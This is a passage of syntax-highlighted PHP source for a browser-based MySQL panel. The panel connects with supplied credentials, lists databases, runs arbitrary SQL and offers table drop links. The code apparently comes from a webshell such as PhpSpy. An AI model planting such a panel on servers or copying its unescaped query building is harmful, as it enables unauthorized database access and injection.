<\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'base64'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'tablename'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#36873;&#23450;&#25968;&#25454;&#24211;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'setdbname'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (!$<span style=\"color: #ffcc66;\">dbname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'dbname'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#36873;&#23450;&#34920;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formhead(array(<\/span><span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'settable'<\/span>));\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'tablename'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'page'<\/span>,$<span style=\"color: #ffcc66;\">page<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'doing'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">formfoot(<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">cachetables<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);<span style=\"color: #f2777a; background-color: #515151;\">     <\/span>\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">pagenum<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">30<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">page<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">intval(<\/span>$<span style=\"color: #ffcc66;\">page<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span>($<span style=\"color: #ffcc66;\">page<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">start_limit<\/span> = ($<span style=\"color: #ffcc66;\">page<\/span> - <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>) * $<span style=\"color: #ffcc66;\">pagenum<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">start_limit<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">page<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> (<span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbuser<\/span>) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">dbpass<\/span>) &amp;&amp; <span style=\"color: #cccccc; background-color: #2d2d2d;\">isset(<\/span>$<span style=\"color: #ffcc66;\">connect<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqllink<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mydbconn(<\/span>$<span style=\"color: #ffcc66;\">dbhost<\/span>, $<span style=\"color: #ffcc66;\">dbuser<\/span>, $<span style=\"color: #ffcc66;\">dbpass<\/span>, $<span style=\"color: #ffcc66;\">dbname<\/span>, $<span style=\"color: #ffcc66;\">charset<\/span>, $<span style=\"color: #ffcc66;\">dbp<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ort<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#25968;&#25454;&#24211;&#20449;&#24687;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">mysqlver<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_get_server_info(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;MySQL '<\/span>.$<span style=\"color: #ffcc66;\">mysqlver<\/span>.<span style=\"color: #66cccc;\">' running in '<\/span>.$<span style=\"color: #ffcc66;\">dbhost<\/span>.<span style=\"color: #66cccc;\">' as '<\/span>.$<span style=\"color: #ffcc66;\">dbuser<\/span>.<span style=\"color: #66cccc;\">'@'<\/span>.$<span style=\"color: #ffcc66;\">dbhos<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">t<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">highver<\/span> = $<span style=\"color: #ffcc66;\">mysqlver<\/span> &gt; <span style=\"color: #66cccc;\">'4.1'<\/span> ? <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span> : <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#33719;&#21462;&#25968;&#25454;&#24211;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">query<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW DATABASES\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbs<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbs<\/span>[] = <span style=\"color: #66cccc;\">'-- Select a database --'<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">db<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">dbs<\/span>[$<span style=\"color: #ffcc66;\">db<\/span>[<span style=\"color: #66cccc;\">'Database'<\/span>]] = $<span style=\"color: #ffcc66;\">db<\/span>[<span style=\"color: #66cccc;\">'Database'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makeselect(array(<\/span><span style=\"color: #66cccc;\">'title'<\/span>=&gt;<span style=\"color: #66cccc;\">'Please select a database:'<\/span>,<span style=\"color: #66cccc;\">'name'<\/span>=&gt;<span style=\"color: #66cccc;\">'db[]'<\/span>,<span style=\"color: #66cccc;\">'op<\/span><span style=\"color: #66cccc; text-decoration: underline;\">tion'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dbs<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'selected'<\/span><span style=\"text-decoration: underline;\">=&gt;$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dbname<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'onchange'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'moddbname(this.options[this.selectedIndex].value)'<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'newline'<\/span><span style=\"text-decoration: underline;\">=&gt;<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">1<\/span><span style=\"text-decoration: underline;\">));<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">dbname<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'Current dababase: &lt;a href=\"javascript:moddbname(\\''<\/span>.$<span style=\"color: #ffcc66;\">dbname<\/span>.<span style=\"color: #66cccc;\">'\\');<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dbname<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">tablename<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">' | Current Table: &lt;a href=\"javascript:settable(\\''<\/span>.$<span style=\"color: #ffcc66;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;'<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/a&gt; [ &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'insert\\');\"&gt;Insert&lt;\/a&gt; | &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'structure\\');\"&gt;Structure&lt;\/a&gt; | &lt;a href=\"javascript:settable(\\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\'drop\\');\"&gt;Drop&lt;\/a&gt; ]'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/p&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_select_db(<\/span>$<span style=\"color: #ffcc66;\">dbname<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">getnumsql<\/span> = <span style=\"color: #66cccc;\">''<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">runquery<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">sql_query<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">runquery<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">allowedit<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">tablename<\/span> &amp;&amp; !$<span style=\"color: #ffcc66;\">sql_query<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">sql_query<\/span> = <span style=\"color: #66cccc;\">\"SELECT * FROM $tablename\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">getnumsql<\/span> = $<span style=\"color: #ffcc66;\">sql_query<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">sql_query<\/span> = $<span style=\"color: #ffcc66;\">sql_query<\/span>.<span style=\"color: #66cccc;\">\" LIMIT $start_limit, $pagenum\"<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">allowedit<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">1<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;form action=\"'<\/span>.$<span style=\"color: #ffcc66;\">self<\/span>.<span style=\"color: #66cccc;\">'\" method=\"POST\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;p&gt;&lt;table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"&gt;<\/span><span style=\"color: #66cccc; text-decoration: underline;\">&lt;tr&gt;&lt;td colspan=\"2\"&gt;Run SQL query\/queries on database '<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">dbname<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">':&lt;\/td&gt;&lt;\/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name=\"sql_query\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\"&gt;'<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">htmlspecialchars(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">sql_query<\/span><span style=\"text-decoration: underline;\">,<\/span><span style=\"color: #6699cc; text-decoration: underline;\">ENT_QUOTES<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;\/textarea&gt;&lt;\/td&gt;&lt;td style=\"padding:0 5px;\"&gt;&lt;input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" \/&gt;&lt;\/td&gt;&lt;\/tr&gt;&lt;\/table&gt;&lt;\/p&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'tablename'<\/span>, $<span style=\"color: #ffcc66;\">tablename<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">makehide(<\/span><span style=\"color: #66cccc;\">'action'<\/span>,<span style=\"color: #66cccc;\">'mysqladmin'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">dbform<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/form&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">tablename<\/span> || ($<span style=\"color: #ffcc66;\">runquery<\/span> &amp;&amp; $<span style=\"color: #ffcc66;\">sql_query<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">doing<\/span> == <span style=\"color: #66cccc;\">'structure'<\/span>) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">result<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW FULL COLUMNS FROM $tablename\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">row<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">rowdb<\/span>[] = $<span style=\"color: #ffcc66;\">row<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h3&gt;Structure&lt;\/h3&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;table border=\"0\" cellpadding=\"3\" cellspacing=\"0\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Field&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Type&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Collation&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Null&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Key&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Default&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Extra&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Privileges&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Comment&lt;\/td&gt;'<\/span>);\n<span 